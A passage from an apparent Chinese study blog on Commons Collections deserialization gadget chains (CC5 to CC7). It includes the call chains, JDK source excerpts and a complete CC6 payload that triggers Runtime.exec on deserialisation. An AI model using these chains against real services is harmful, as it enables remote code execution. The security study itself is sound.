<span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> ChainedTransformer <span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ConstantTransformer ct<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"invoke"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it_exec<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>ct<span class="token punctuation">,</span>it1<span class="token punctuation">,</span>it2<span class="token punctuation">,</span>it_exec<span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注意payload中的<code>BadAttributeValueExpException e=new BadAttributeValueExpException(null);</code>，我们赋值null，防止还未进行反序列化就进行攻击，具体原因可以看构造函数。</p><h2 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h2><h3 id="调用链-2"><a href="#调用链-2" class="headerlink" title="调用链"></a>调用链</h3><pre class=" language-1"><code class="language-1">    /*    Gadget chain:        ObjectInputStream.readObject()            HashSet.readObject()                HashMap.put()                HashMap.hash()                    TiedMapEntry.hashCode()                    TiedMapEntry.getValue()                        LazyMap.get()                            ChainedTransformer.transform()                            InvokerTransformer.transform()                            Method.invoke()                                Runtime.exec()*/</code></pre><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>jdk没有版本限制</p><pre class=" language-1"><code class="language-1"><dependency>    <groupId>commons-collections</groupId>    <artifactId>commons-collections</artifactId>    <version>3.1</version></dependency></code></pre><h3 id="TiedMapEntry-1"><a href="#TiedMapEntry-1" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>与CC5中利用<code>TiedMapEntry</code>中的<code>toString()</code>调用<code>getValue</code>不同，CC6采用<code>hashCode</code>方法触发<code>getValue</code>。</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>看<code>HashMap</code>中有调用<code>key.hashCode()</code>，<code>key</code>为输入，那我们可以让<code>key</code>为<code>TiedMapEntry</code>即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> h<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并且在<code>put</code>中也会触发<code>hash</code>。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p><code>HashSet</code>的<code>readObject</code>中会调用<code>map.put(e, PRESENT);</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Read in any hidden serialization magic</span>        s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read capacity and verify non-negative.</span>        <span class="token keyword">int</span> capacity <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>capacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal capacity: "</span> <span class="token operator">+</span>                                             capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Read load factor and verify positive and non NaN.</span>        <span class="token keyword">float</span> loadFactor <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>loadFactor <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> Float<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal load factor: "</span> <span class="token operator">+</span>                                             loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Read size and verify non-negative.</span>        <span class="token keyword">int</span> size <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal size: "</span> <span class="token operator">+</span>                                             size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Set the capacity according to the size and load factor ensuring that</span>        <span class="token comment" spellcheck="true">// the HashMap is at least 25% full but clamping to maximum capacity.</span>        capacity <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>size <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> loadFactor<span class="token punctuation">,</span> <span class="token number">4.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                HashMap<span class="token punctuation">.</span>MAXIMUM_CAPACITY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Create backing HashMap</span>        map <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HashSet<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashSet</span> <span class="token operator">?</span>               <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span> <span class="token operator">:</span>               <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read in all elements in the proper order.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                E e <span class="token operator">=</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashSet<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc6</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazymap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazymap<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashSet hashSet<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        lazymap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> ChainedTransformer <span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ConstantTransformer ct<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"invoke"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it_exec<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>ct<span class="token punctuation">,</span>it1<span class="token punctuation">,</span>it2<span class="token punctuation">,</span>it_exec<span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="序列化报错"><a href="#序列化报错" class="headerlink" title="序列化报错"></a>序列化报错</h3><p>因为序列化前会多<code>put</code>一遍,把<code>java.lang.ProcessImpl</code>也给序列化了，但是它是<code>not serializable</code>的。<br><code>debug</code>就不赘述了，可以拜读文末<code>phtihon</code>的大作<br>加一句<code>lazymap.remove(1);</code>即可。</p><p>这里我没太理解，按照p神写的，是<code>HashMap.hash()</code>方法中同时也会调用到<code>LazyMap</code>这个利用链，试着跟了一下，发现在<code>new``TiedMapEntry</code>时设置了key，在调用<code>LazyMap.get()</code>时，无法通过<code>!super.map.containsKey(key)</code>的check，导致无法进行<code>transform</code>调用。所以需要提前<code>remove</code>。但是bridge在写的时候又说是因为序列化的问题，不是很懂，但是先咕咕了。</p><h2 id="CC7链"><a href="#CC7链" class="headerlink" title="CC7链"></a>CC7链</h2><h3 id="调用链-3"><a href="#调用链-3" class="headerlink" title="调用链"></a>调用链</h3><pre class=" language-1"><code class="language-1">/*    Payload method chain:    java.util.Hashtable.readObject    java.util.Hashtable.reconstitutionPut    org.apache.commons.collections.map.AbstractMapDecorator.equals    java.util.AbstractMap.equals    org.apache.commons.collections.map.LazyMap.get    org.apache.commons.collections.functors.ChainedTransformer.transform    org.apache.commons.collections.functors.InvokerTransformer.transform    java.lang.reflect.Method.invoke    java.lang.Runtime.exec*/</code></pre><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><p>jdk无限制<br>CommonsCollections 3.1 - 3.2.1</p><h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><p><code>readObject</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>         <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Read in the length, threshold, and loadfactor</span>        s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read the original length of the array and number of elements</span>        <span class="token keyword">int</span> origlength <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> elements <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Compute new size with a bit of room 5% to grow but</span>        <span class="token comment" spellcheck="true">// no larger than the original size.  Make the length</span>        <span class="token comment" spellcheck="true">// odd if it's large enough, this helps distribute the entries.</span>        <span class="token comment" spellcheck="true">// Guard against the length ending up zero, that's not valid.</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>elements <span class="token operator">*</span> loadFactor<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>elements <span class="token operator">/</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">></span> elements <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            length<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>origlength <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> length <span class="token operator">></span> origlength<span class="token punctuation">)</span>            length <span class="token operator">=</span> origlength<span class="token punctuation">;</span>        table <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        threshold <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>length <span class="token operator">*</span> loadFactor<span class="token punctuation">,</span> MAX_ARRAY_SIZE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read the number of elements and then all the key/value objects</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> elements <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> elements<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// synch could be eliminated for performance</span>            <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><code>reconstitutionPut</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span>        <span class="token keyword">throws</span> StreamCorruptedException    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//value不能为null</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Makes sure the key is not already in the hashtable.</span>        <span class="token comment" spellcheck="true">// This should not happen in deserialized version.</span>        <span class="token comment" spellcheck="true">//重新计算key的hash值</span>        <span class="token keyword">int</span> hash <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" 